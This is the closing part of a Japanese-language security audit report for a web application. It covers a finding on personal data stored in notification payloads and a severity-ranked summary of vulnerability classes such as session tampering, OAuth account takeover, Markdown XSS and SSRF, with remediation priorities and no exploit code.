### 44. 通知 payload に PII (displayName / excerpt) を JSON 文字列で保存

- 位置: `src/app/actions/event-actions.ts:131-134`、`src/app/actions/comment-actions.ts:147-150` 等
- 説明: Notification.payload に `displayName`、`excerpt` (コメント先頭 80 文字) を生で保存。PII というほどではないが、ユーザー削除時に通知から逆引きできてしまう。
- 提案: GDPR 等を考慮するなら、payload には ID のみ保存し、表示時に join して取得。

---

## 件数サマリー (日本語)

- Critical: **6 件** (即修正必須)
  1. te_session cookie 改ざんによるなりすまし
  2. OAuth signIn での email 自動リンクによるアカウントテイクオーバー
  3. Stripe Webhook 署名検証のフォールバック
  4. Markdown XSS (marked + dangerouslySetInnerHTML, sanitize なし)
  5. Slack Webhook URL SSRF
  6. dev-login / test endpoint の disable 判定が NODE_ENV 単独
- High: **11 件** (1 週間以内)
  - Magic Link verify GET prefetch / open redirect / Webhook idempotency / metadata 検証 / API キー timing-unsafe / rate limit バイパス / 画像 magic byte 未検証 / public/uploads 直接保存 / AUTH_SECRET フォールバック / CRON secret URL クエリ / コメント削除権限 / joinPaidEvent 検証 / 認可チェック横展開 / JSON-LD script breakout / marked 同期 DoS
- Medium: **10 件** (1 ヶ月以内)
  - login user enumeration timing / レート制限欠如 / email lowercase 統一 / Blast 配信ログ / Slack escape / CORS allowlist / Server Action CSRF allowlist 明示 / formValueRaw trim / 予約語 / AuditLog 未書込
- Low: **6 件** (将来対応)
  - logout CSRF / themeBackgroundStyle image 拡張時 SSRF / Prisma error message 漏洩 / host header 信頼 / x-pathname 明示クリア / dev.db
- Best Practice: **7 件** (改善提案)
  - CSP / Security headers / パスワードポリシー / bcrypt cost / secret URL 統一 / te_session 廃止 / Notification payload PII

特に **Critical 1 (te_session 平文)**, **Critical 2 (OAuth email リンク)**, **Critical 3 (Stripe webhook フォールバック)**, **Critical 4 (Markdown XSS)** はそれぞれ単独でアカウント乗っ取り or 任意コード実行に直結するため、最優先で対応すべきです。
